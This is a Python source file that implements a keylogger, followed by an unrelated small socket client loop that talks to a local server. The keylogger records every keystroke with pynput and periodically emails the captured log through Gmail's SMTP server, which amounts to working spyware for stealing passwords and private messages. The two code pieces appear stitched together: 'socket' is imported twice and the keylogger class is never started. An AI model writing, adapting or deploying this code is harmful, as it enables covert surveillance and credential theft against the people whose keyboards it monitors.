import smtplib

import socket
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

# Create Keylogger Class

class KeyLogger:

    # Define __init__ variables

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    # Create Log which all keystrokes will be appended to

    def append_to_log(self, string):
        self.log = self.log + string

    # Create Keylogger

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)


    # Create underlying back structure which will publish emails

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        message=message.format("utf-8")
        server.sendmail(email, email, message)
        server.quit()

    # Create Report & Send Email

    def report_n_send(self):
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        send_off
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    # Start KeyLogger and Send Off Emails

    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()

import socket
play=True
while play:
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.connect(("127.0.0.1", 5555))
    msg=input("what?")
    my_socket.send(msg.encode())
    data = my_socket.recv(1024).decode()
    print("The server sent " + data)
    if data=="stop":
        my_socket.close()